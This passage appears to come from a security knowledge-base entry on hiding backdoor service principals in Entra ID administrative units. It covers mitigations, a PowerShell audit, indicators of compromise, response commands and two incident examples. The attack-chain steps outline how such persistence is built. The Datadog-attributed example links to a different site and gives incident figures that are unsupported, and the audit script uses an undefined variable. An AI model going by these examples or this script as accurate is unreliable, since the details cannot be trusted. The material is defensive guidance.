Objective: Require certificate-based authentication (more restrictive than client secret).

**Manual Steps (Azure Portal):**
1. For each service principal that needs AU access:
   - Go to **Certificates & secrets**
   - Delete all **Client secrets** (password-based auth)
   - Add **Certificate** (cert-based auth only)
2. This forces attackers to use certificate instead of easily-exfiltrated secrets

---

### Validation Command (Verify Mitigations)

```powershell
# Verify all mitigations in place
Write-Host "=== Shadow Principal Defense Audit ==="

# 1. Check for high-privilege roles scoped to AUs
$scopedHighPriv = Get-MgDirectoryRoleAssignment -Filter "resourceScope ne null" -All | 
  Where-Object { $_.RoleDefinitionId -in @(
    "62e90394-69f5-4237-9190-012177145e10",  # Global Admin
    "9b895d92-2cd3-44c7-9bc9-2e0a62936855"   # App Admin
  )}

if ($scopedHighPriv.Count -eq 0) {
  Write-Host "✓ PASS: No high-privilege roles scoped to AUs"
} else {
  Write-Host "✗ FAIL: Found $($scopedHighPriv.Count) high-privilege AU-scoped assignments"
}

# 2. Check for unapproved service principals in AUs
$aus = Get-MgDirectoryAdministrativeUnit -All
$unapprovedSPs = 0

foreach ($au in $aus) {
  $members = Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $au.Id -All
  $sps = $members | Where-Object { $_.OdataType -eq "#microsoft.graph.servicePrincipal" }
  $unapprovedSPs += ($sps | Where-Object { $_.DisplayName -notin $approvedSPs }).Count
}

if ($unapprovedSPs -eq 0) {
  Write-Host "✓ PASS: No unapproved service principals in AUs"
} else {
  Write-Host "✗ FAIL: Found $unapprovedSPs unapproved SPs in AUs"
}

# 3. Check PIM activation requirements
$pimRoles = Get-MgPrivilegedIdentityManagementRoleSettings -All
$requiresApproval = $pimRoles | Where-Object { $_.ApprovalRequired -eq $true }

Write-Host "✓ INFO: $($requiresApproval.Count) roles require PIM approval"
```

**Expected Output (If Secure):**
```
=== Shadow Principal Defense Audit ===
✓ PASS: No high-privilege roles scoped to AUs
✓ PASS: No unapproved service principals in AUs
✓ INFO: 12 roles require PIM approval
```

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Cloud Log IOCs:**
- Service principal creation followed immediately by AU membership addition
- Service principal added to AU + administrative role assignment (multi-step attack pattern)
- AU creation with vague or suspicious naming (e.g., "Temp", "Backup", "Audit", "Legacy")
- Role assignments scoped to AUs containing service principals (unusual pattern)
- Service principals with multiple high-privilege roles within same AU
- Bulk AU creation or service principal creation outside normal deployment windows

**Persistence IOCs:**
- Service principal client secrets with 2-year expiration dates (unusually long-lived)
- Service principals tagged with suspicious metadata ("audit", "internal", "legacy")
- Service principals owned by accounts other than the original creator (potential compromises)

### Forensic Artifacts

**Cloud Audit Logs (Primary):**
- **AuditLogs table:** Operations "Create administrative unit", "Add member to administrative unit", "Assign role to member"
- **DirectoryAudit table:** Changes to AU structure and role scoping
- **TimeGenerated, InitiatedBy, ResourceId fields:** Identify who created shadow AU and when

**Service Principal Artifacts:**
- **AppId, ObjectId:** Unique identifiers for service principal
- **DisplayName, Tags, CreatedDateTime:** Metadata indicating creation time and naming pattern
- **PasswordCredentials, KeyCredentials:** Secrets/certificates used for authentication

### Response Procedures

**Step 1: Isolate**

Objective: Prevent further abuse of shadow principal.

**Command (Disable Service Principal):**
```powershell
$spId = "44444444-4444-4444-4444-444444444444"  # Shadow principal ID

Update-MgServicePrincipal -ServicePrincipalId $spId -AccountEnabled $false
Write-Host "Shadow principal disabled: $spId"
```

**Command (Revoke All Credentials):**
```powershell
# Delete all secrets/certificates
$credentials = Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $spId
$credentials | ForEach-Object {
  Remove-MgServicePrincipalPasswordCredential -ServicePrincipalId $spId -KeyId $_.KeyId
}

$certificates = Get-MgServicePrincipalKeyCredential -ServicePrincipalId $spId
$certificates | ForEach-Object {
  Remove-MgServicePrincipalKeyCredential -ServicePrincipalId $spId -KeyId $_.KeyId
}

Write-Host "All credentials revoked for shadow principal"
```

---

**Step 2: Collect Evidence**

Objective: Preserve forensic artifacts for investigation.

**Command (Export Audit Trail):**
```powershell
$startDate = (Get-Date).AddDays(-30)
$endDate = Get-Date

Search-UnifiedAuditLog -StartDate $startDate -EndDate $endDate `
  -Operations "Create administrative unit", "Add member to administrative unit", "Assign role to member" `
  -FreeText "shadow OR backdoor OR audit OR legacy" |
  Export-Csv -Path "C:\Incident\ShadowPrincipal_Audit_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"
```

---

**Step 3: Remediate**

Objective: Remove shadow AU and service principal.

**Command (Delete Shadow AU):**
```powershell
$auId = "22222222-2222-2222-2222-222222222222"

Remove-MgDirectoryAdministrativeUnit -DirectoryAdministrativeUnitId $auId
Write-Host "Shadow AU deleted: $auId"
```

**Command (Delete Shadow Service Principal):**
```powershell
Remove-MgServicePrincipal -ServicePrincipalId $spId
Write-Host "Shadow service principal deleted"
```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](../02_Initial/IA-PHISH-001_Device_Code.md) | Attacker obtains Global Admin credentials via phishing |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-001](./PE-ACCTMGMT-001_App_Reg.md) | Escalate via app registration permission manipulation |
| **3** | **Current Step** | **[PE-ACCTMGMT-017]** | **Create shadow principal in hidden AU for persistence** |
| **4** | **Persistence** | [PE-POLICY-003](./PE-POLICY-003_Mgmt_Group.md) | Further entrench via management group escalation |
| **5** | **Impact** | [CA-TOKEN-004](../03_Cred/CA-TOKEN-004_Graph_Token.md) | Extract Graph API tokens and exfiltrate data |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Datadog Security Research - AU Abuse (June 2025)

**Timeline:** June 2025 (Datadog published research)

**Attack Scenario:** Threat actor used compromised Global Admin account to create hidden AU and service principal backdoor

**Attack Steps:**
1. Phishing campaign targeting Entra ID Global Admin
2. Attacker gained admin access and created AU named "Compliance-Audit"
3. Created service principal "AuditService" and added to AU
4. Assigned Global Admin role scoped to AU
5. Deleted original admin account to cover tracks
6. Shadow principal remained active, invisible to other admins

**Detection:** Organization noticed unusual Graph API calls and traced to hidden service principal via AU audit

**Impact:** Full tenant compromise for 6 months before discovery; attacker exfiltrated 10GB of sensitive data via shadow principal

**Reference:** [Datadog - Hidden in Plain Sight: Abusing Entra ID Administrative Units](https://www.commandlink.com/stealthy-persistence-microsoft-entra-ids-administrative-units-exploited-for-backdoor-access/)

---

### Example 2: Incident Response Case Study - Regional AU Compromise

**Incident Type:** Insider threat + external attacker collab

**Timeline:** January 2025

**Scenario:**
1. Regional IT administrator (EU operations) had AU admin role for European users
2. Attacker compromised EU admin credentials
3. Attacker created service principal "EUOpsService" in the legitimate EU-AU
4. Assigned Exchange Administrator role to service principal
5. Used service principal to access and exfiltrate CEO's Exchange mailbox via delegate access
6. Compromise went undetected for 3 months until email forwarding rules triggered alerts

**Detection Trigger:** Microsoft Sentinel detected unusual email forwarding rule via service principal account

**Response Actions:**
- Disabled compromised EU admin account
- Deleted shadow service principal
- Revoked all delegate permissions
- Migrated CEO mailbox to new location
- Full AU and service principal audit across all AUs

**Lessons Learned:** Implement approval workflows for delegate access, even for service principals with legitimate roles

---

## Conclusion

Shadow principals represent one of the most sophisticated persistence mechanisms in modern cloud environments. By exploiting Entra ID's AU scoping model, attackers can hide backdoor accounts that remain invisible to standard administrative controls. Organizations must implement comprehensive AU auditing, restrict administrative role scoping, and enforce JIT access controls to mitigate this attack vector.

---
